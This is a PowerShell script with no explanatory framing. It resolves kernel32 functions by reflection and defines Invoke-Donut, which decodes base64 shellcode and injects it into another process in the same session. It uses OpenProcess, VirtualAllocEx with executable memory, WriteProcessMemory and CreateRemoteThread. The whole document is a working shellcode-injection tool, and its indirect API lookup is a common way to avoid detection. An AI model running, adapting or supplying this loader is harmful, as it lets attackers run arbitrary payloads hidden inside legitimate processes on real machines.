function Local:Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
        
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
        
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
    
    Write-Output $TypeBuilder.CreateType()
}

function Local:Get-ProcAddress
{
    Param
    (
        [OutputType([IntPtr])]
    
        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $Module,
        
        [Parameter( Position = 1, Mandatory = $True )]
        [String]
        $Procedure
    )

    # Get a reference to System.dll in the GAC
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
    # Get a handle to the module specified
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    
    # Return the address of the function
    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}

# kernel32.dll OpenProcess()
$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)

# kernel32.dll VirtualAllocEx()
$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)

# kernel32.dll WriteProcessMemory()
$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
$WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)

# kernel32.dll CreateRemoteThread()
$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
$CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)

# kernel32.dll CloseHandle()
$CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
$CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

function Invoke-Donut
{
    Param
    (
        [Parameter()]
        [String]
        $ProcessName,
        
        [Parameter()]
        [String]
        $ShellcodeB64
    )

    $targetProcess = (Get-Process | ? {$_.SI -eq (Get-Process -PID $PID).SessionId} | ? {$_.ProcessName -contains "$ProcessName"}).Id[0]
    $sc = [Convert]::FromBase64String($ShellcodeB64)

    $procHandle = $OpenProcess.Invoke(0x001F0FFF, $false, $targetProcess)
    $allocMemAddr = $VirtualAllocEx.Invoke($procHandle, [IntPtr]::Zero, $sc.Length + 1, 0x3000, 0x40)
    $WriteProcessMemory.Invoke($procHandle, $allocMemAddr, $sc, $sc.Length, [Ref] 0) | Out-Null
    $CreateRemoteThread.Invoke($procHandle, [IntPtr]::Zero, 0, $allocMemAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero) |Out-Null
}
